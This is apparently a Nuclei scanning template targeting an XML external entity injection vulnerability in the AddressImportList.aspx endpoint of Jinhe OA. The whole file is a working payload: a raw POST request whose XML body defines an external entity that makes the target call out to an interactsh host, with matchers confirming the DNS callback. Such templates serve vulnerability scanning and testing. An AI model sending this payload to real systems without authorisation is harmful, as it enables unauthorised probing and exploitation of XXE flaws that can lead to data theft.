id: jinhe-oa-addressimportlist-xxe
info:
  name: 金和OA AddressImportList.aspx接口XML外部实体注入漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fafa: app="金和网络-金和OA"
  tags: 金和OA
http:
- raw:
  - |
    POST /c6/Jhsoft.Web.addressbook/AddressImportList.aspx/ HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/xml

    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [
    <!ENTITY % remote SYSTEM "http://{{interactsh-url}}">
    %remote;]>
    <root/>
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: interactsh_protocol
    words:
    - "dns"
